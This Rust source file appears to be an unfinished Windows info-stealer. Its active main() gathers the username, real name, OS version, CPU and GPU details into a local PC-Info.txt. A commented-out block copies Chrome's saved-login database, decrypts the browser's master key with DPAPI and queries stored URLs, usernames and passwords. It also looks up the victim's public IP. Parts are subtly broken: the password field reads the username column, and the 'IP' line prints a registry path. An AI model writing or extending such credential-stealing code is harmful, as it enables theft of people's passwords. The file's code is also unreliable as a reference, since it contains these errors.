use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
use std::io::Write;
use std::fs::File;


fn crop_letters(s: &str, pos: usize) -> &str {
    match s.char_indices().skip(pos).next() {
        Some((pos, _)) => &s[pos..],
        None => "",
    }
}

/*use whoami;
use serde::Deserialize;
use serde_json::Value;
use platform_dirs::AppDirs;
use rusqlite::{Connection, Result};
use winapi::{um::wincrypt::CRYPTOAPI_BLOB, um::dpapi::CryptUnprotectData, shared::minwindef::BYTE};
use std::{convert::TryInto, ptr, io::BufReader, io::Read, fs::File, path::PathBuf, fs};



struct User {
    ip: String,
    username: String,
    hostname: String,
}

struct Chrome {
    url: String,
    login: String,
    password: String,
}

#[derive(Deserialize)]
struct Ip {
origin: String,
}

impl User {
    fn ip() -> Result<String, ureq::Error> {
    let body: String = ureq::get("http://httpbin.org/ip")
    .call()?
    .into_string()?;
    let ip: Ip = serde_json::from_str(body.as_str()).unwrap();
    Ok(ip.origin)
    }
}

impl Chrome {
    fn local_app_data_folder(open: &str) -> PathBuf {
        AppDirs::new(Some(open), false).unwrap().data_dir
    }


    fn chrome_saved_key() -> Result<Vec<BYTE>, std::io::Error> {
        let local_state_path = Chrome::local_app_data_folder("Google\\Chrome\\User Data\\Local State");
        let file = File::open(local_state_path)?;
        
        let mut buf_reader = BufReader::new(file);
        let mut contents = String::new();
        buf_reader.read_to_string(&mut contents)?;
        
        let deserialized_content: Value = serde_json::from_str(contents.as_str())?;
        
        let mut encrypted_key = deserialized_content["os_crypt"]["encrypted_key"].to_string();
        encrypted_key = (&encrypted_key[1..encrypted_key.len() - 1]).parse().unwrap();
        
        let decoded_password = base64::decode(encrypted_key).unwrap();
        let mut password = decoded_password[5..decoded_password.len()].to_vec();
        let bytes: u32 = password.len().try_into().unwrap();
        
        let mut blob = CRYPTOAPI_BLOB { cbData: bytes, pbData: password.as_mut_ptr() };
        let mut new_blob = CRYPTOAPI_BLOB { cbData: 0, pbData: ptr::null_mut() };
        
        unsafe {
        CryptUnprotectData(
        &mut blob,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        &mut new_blob,
        )
        };
        
        let cb_data = new_blob.cbData.try_into().unwrap();
        
        let res = unsafe {
        Vec::from_raw_parts(new_blob.pbData, cb_data, cb_data)
        };
        
        println!("{:?}", res);
        
        Ok(res)
        }

    fn find_db() -> std::io::Result<PathBuf> {
        let local_sqlite_path = Chrome::local_app_data_folder("Google\\Chrome\\User Data\\Default\\Login Data");
        let moved_to = Chrome::local_app_data_folder("sqlite_file");
        let db_file = moved_to.clone();
        fs::copy(local_sqlite_path, moved_to)?;
        
        Ok(db_file)
    }

    fn obtain_data_from_db() -> Result<Vec<Chrome>> {
        let conn = Connection::open(Chrome::find_db().unwrap())?;
        
        let mut stmt = conn.prepare("SELECT action_url, username_value, password_value from logins")?;
        let chrome_data = stmt.query_map([], |row| {
        Ok(Chrome {
        url: row.get(0)?,
        login: row.get(1)?,
        password: row.get(1)?,
        })
        })?;
        
        let mut result = vec![];
        
        for data in chrome_data {
        result.push(data.unwrap());
        } 
        
        Ok(result)
        }
}


fn main(){
    let res = Chrome::obtain_data_from_db();


    println!("{:?}", res.unwrap());

    Chrome::chrome_saved_key();
}
*/



fn main()
{
   let hklm = winreg::RegKey::predef(HKEY_LOCAL_MACHINE);
   let subkey = hklm.open_subkey_with_flags(r#"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"#, KEY_READ).expect("Failed to open subkey");
   let cpu: String = subkey.get_value("ProcessorNameString").expect("Failed to read processor name");

   let subkey = hklm.open_subkey_with_flags(r#"HARDWARE\\DeviceMap\\Video"#, KEY_READ).expect("Failed to open subkey");
   let gpua: String = subkey.get_value("\\Device\\Video0").expect("Failed to read GPU");

    let mut file = File::create("PC-Info.txt").expect("Not working");

    let cropped = crop_letters(&gpua, 57);

    let mut a: String = cropped.to_string();

    for n in 1..6 {
        a.pop();
    }

    let mut location: String = "\\SYSTEM\\CurrentControlSet\\Control\\Video\\".to_string();

    
    location.push_str(&a);

    location.push_str(&"\\0000");

    

   //let subkey = hklm.open_subkey_with_flags(location, KEY_READ).expect("Failed to open subkey");
   //let gpu: String = subkey.get_value(r#"HardwareInformation.AdapterString"#).expect("Failed to read GPU");
    
    let text = format!("Username: {}\nReal name: {}\nWindows version: {}\nProcessor: {}\nIP: {}", whoami::username(), whoami::realname(), whoami::distro(), cpu, location);

    file.write_all(text.as_bytes());
}